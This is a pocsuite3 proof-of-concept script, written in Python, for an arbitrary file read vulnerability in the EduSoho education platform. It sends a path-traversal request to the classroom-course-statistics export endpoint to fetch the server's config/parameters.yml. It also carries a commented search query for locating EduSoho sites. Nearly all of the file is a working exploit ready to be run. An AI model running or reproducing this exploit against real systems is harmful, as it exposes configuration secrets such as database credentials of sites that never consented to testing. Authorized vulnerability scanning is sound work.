# _*_ coding:utf-8 _*_
# @Time : 2024/1/27
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class edusoho_files_fileread(POCBase):
    pocDesc = '''EduSoho任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-27'
    name = 'EduSoho任意文件读取漏洞'
    #	title="Powered By EduSoho" || body="Powered by <a href=\"http://www.edusoho.com/\" target=\"_blank\">EduSoho" || (body="Powered By EduSoho" && body="var app")

    def _verify(self):

        result = {}
        url = self.url+ '/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml'
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"

        }


        try:


            response = requests.get(url,headers=headers)
            if response.status_code == 200 and 'parameters' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(edusoho_files_fileread)
